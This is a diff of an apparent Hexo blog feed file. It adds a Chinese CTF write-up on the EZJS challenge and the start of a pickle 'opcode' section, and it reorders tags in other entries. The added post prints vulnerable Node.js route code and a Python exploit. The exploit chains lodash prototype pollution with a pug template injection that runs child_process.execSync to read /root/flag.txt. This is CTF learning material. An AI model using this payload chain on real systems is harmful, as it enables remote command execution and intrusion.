@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>巅峰极客总结</title>
+    <link href="/2021/08/09/2021-8-6-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2web%E5%A4%8D%E7%8E%B0/"/>
+    <url>/2021/08/09/2021-8-6-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2web%E5%A4%8D%E7%8E%B0/</url>
+    
+    <content type="html"><![CDATA[<h1 id="EZJS"><a href="#EZJS" class="headerlink" title="EZJS"></a>EZJS</h1><p>一点都不ez，看了一下午还是没做出来，感觉要被开了，以前没咋遇到过js的原型链污染，现学了一下原理但还是没找不到链，属实自己的js水平太烂了。</p><p>这里用到的原型链污染原理参考:<a href="https://paper.seebug.org/1426/#_1">https://paper.seebug.org/1426/#_1</a></p><p>pug的rce漏洞原理参考：<a href="https://github.com/pugjs/pug/issues/3312">https://github.com/pugjs/pug/issues/3312</a></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>随便登录后可以在<code>newimg</code>发现文件读取。可以先读取<code>package.json</code>,<code>package-lock.json</code>看看版本。</p><p><img src="https://img-blog.csdnimg.cn/5eda8a13f65c4647acc9b3d120cf2840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><code>lodash</code>&lt;4.17.17时存在原型链污染漏洞，pug有rce命令执行。看一下<code>index.js</code>源码，核心部分如下。</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">router.get(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  <span class="hljs-comment">//req.session.debug = true;</span><br><br>  <span class="hljs-keyword">if</span> (req.session.username !== <span class="hljs-literal">undefined</span> &amp;&amp; req.session.isadmin !== <span class="hljs-literal">undefined</span>) &#123;<br><br>    <span class="hljs-keyword">if</span> (req.query.newimg !== <span class="hljs-literal">undefined</span>) req.session.img = req.query.newimg;<br><br>    <span class="hljs-keyword">var</span> imgdata = fs.readFileSync(req.session.img? req.session.img: <span class="hljs-string">&quot;./images/1.png&quot;</span>);<br>    <span class="hljs-keyword">var</span> base64data = Buffer.from(imgdata, <span class="hljs-string">&#x27;binary&#x27;</span>).toString(<span class="hljs-string">&#x27;base64&#x27;</span>);<br><br>    <span class="hljs-keyword">var</span> info = &#123;<span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;我的空间&#x27;</span>, <span class="hljs-attr">msg</span>: req.session.username, <span class="hljs-attr">png</span>: <span class="hljs-string">&quot;data:image/png;base64,&quot;</span> + base64data, <span class="hljs-attr">diy</span>: <span class="hljs-string">&quot;十年磨一剑v0.0.0(尚处于开发版&quot;</span>&#125;;<br><br><br>    <span class="hljs-keyword">if</span> (req.session.isadmin !== <span class="hljs-string">&quot;notadmin&quot;</span>) &#123;<br><br>      <span class="hljs-keyword">if</span> (req.session.debug !== <span class="hljs-literal">undefined</span> &amp;&amp; req.session.debug !== <span class="hljs-literal">false</span>) info.pretty = req.query.p;<br>      <span class="hljs-keyword">if</span> (req.query.diy !== <span class="hljs-literal">undefined</span>) req.session.diy = req.query.diy;<br>      info.diy = req.session.diy ? req.session.diy: <span class="hljs-string">&quot;尊贵的admin&quot;</span>;<br>      <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">&#x27;admin&#x27;</span>, info);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">&#x27;admin&#x27;</span>, info);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">&#x27;msg&#x27;</span>, &#123;<span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;plz login first&#x27;</span>&#125;);<br>  &#125;<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>这个地方就是可以读取源码的漏洞原因。</p><p><img src="https://img-blog.csdnimg.cn/068344140be04497ad8f415f499b424d.png" alt="在这里插入图片描述"></p><p>往下看，判断<code>req.session.isadmin !== &quot;notadmin&quot;</code>，然后的判断是关键。这里需要将<code>req.session.debug</code>污染成空值或其他的满足条件的来绕过，然后就可以利用<code>pug</code>的RCE来执行命令。</p><p><img src="https://img-blog.csdnimg.cn/9cc5405b335c4fdfac77ae4691fa660b.png" alt="在这里插入图片描述"></p><p>这里需要注意的是参考文章里面的<code>payload</code>中存在转义号，这是因为那个里面用了<code>json</code>解析，则要用转义号转移引号，这里则不需要。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://localhost:5000/&quot;</span><br>session=requests.session()<br>session.post(url+<span class="hljs-string">&#x27;login&#x27;</span>,data=&#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">26</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">26</span><br>&#125;)<br>payload=&#123;<span class="hljs-string">&#x27;&quot;].__proto__[&quot;isadmin&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>,<br><span class="hljs-string">&#x27;&quot;].__proto__[&quot;debug&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>&#125;<br>r=session.get(url+<span class="hljs-string">&#x27;admin&#x27;</span>,params=&#123;<br>    <span class="hljs-string">&quot;p&quot;</span>:<span class="hljs-string">&quot;&#x27;);return process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;tac /root/flag.txt&#x27;);_=(&#x27;&quot;</span><br>&#125;,data=payload)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></div></td></tr></table></figure><p>中间很多自己node搭环境调试的过程就懒得贴了，总结一下编程代码功底还是最基础的东西呀！！！</p><h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>考的是<code>pickle</code>的知识</p><p>参考：<a href="https://www.freebuf.com/articles/web/264363.html">https://www.freebuf.com/articles/web/264363.html</a></p><p>​            <a href="https://zhuanlan.zhihu.com/p/361349643">https://zhuanlan.zhihu.com/p/361349643</a></p><p><code>pickle.dumps</code>将对象反序列化为字符串，<code>pickle.dump</code>将反序列化后的字符串存储为文件。</p><p><code>pickle.loads() </code>对象反序列化 <code>pickle.load()</code> 对象反序列化，从文件中读取数据。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>ctf</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+      <tag>ctf</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>关于反序列化中原生类的利用</title>
     <link href="/2021/08/02/2021-8-1-%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
     <url>/2021/08/02/2021-8-1-%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
@@ -446,9 +473,9 @@
     
     <tags>
       
-      <tag>BUU</tag>
-      
       <tag>web</tag>
+      
+      <tag>BUU</tag>
       
     </tags>
     
@@ -473,9 +500,9 @@
     
     <tags>
       
-      <tag>BUU</tag>
-      
       <tag>web</tag>
+      
+      <tag>BUU</tag>
       
     </tags>
     
@@ -552,9 +579,9 @@
     
     <tags>
       
-      <tag>BUU</tag>
-      
       <tag>web</tag>
+      
+      <tag>BUU</tag>
       
     </tags>
     
@@ -579,9 +606,9 @@
     
     <tags>
       
-      <tag>BUU</tag>
-      
       <tag>web</tag>
+      
+      <tag>BUU</tag>
       
     </tags>
     
@@ -606,9 +633,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>python</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
